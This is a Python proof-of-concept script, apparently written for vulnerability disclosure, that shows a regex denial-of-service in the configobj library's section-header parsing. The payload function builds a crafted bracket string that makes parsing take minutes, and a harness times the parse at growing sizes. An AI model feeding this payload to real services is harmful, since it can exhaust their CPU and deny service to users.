#!/usr/bin/env python3
"""Non-destructive proof-of-concept for the configobj section-header ReDoS.

Independent rediscovery of the issue first reported in DiffSK/configobj issue #281.
This script ONLY times parsing of an in-memory payload. It writes no files and runs
no external commands.

Usage:
    pip install "configobj==5.0.9"
    python3 configobj_redos_poc.py           # runs a growth table
    python3 configobj_redos_poc.py 800        # single run with n=800 brackets

A single line of a few thousand characters makes ConfigObj() consume minutes of CPU.
Run with a timeout in production experiments; large n will appear to hang.
"""
import sys
import time

try:
    from configobj import ConfigObj
except ImportError:
    sys.exit("Install the target first:  pip install 'configobj==5.0.9'")


def payload(n: int) -> str:
    # Many '[' then a name then one-short ']' run and a trailing non-bracket char,
    # forcing the section-marker regex to backtrack across all bracket partitions.
    return "[" * n + "x" + "]" * (n - 1) + "!"


def timed(n: int) -> float:
    line = payload(n)
    t0 = time.perf_counter()
    try:
        ConfigObj(line.splitlines())
    except Exception:
        pass  # a ParseError is expected; the cost is in the regex, not the error
    return time.perf_counter() - t0


def main() -> None:
    if len(sys.argv) > 1:
        n = int(sys.argv[1])
        print(f"n={n} line_len={len(payload(n))} time={timed(n):.3f}s")
        return
    print("configobj section-header ReDoS — parse time vs. input size")
    for n in (100, 200, 400, 800):
        dt = timed(n)
        print(f"  n={n:4d}  line_len={len(payload(n)):5d}  time={dt:8.3f}s")
        if dt > 20:
            print("  (stopping; growth is clearly super-linear)")
            break


if __name__ == "__main__":
    main()
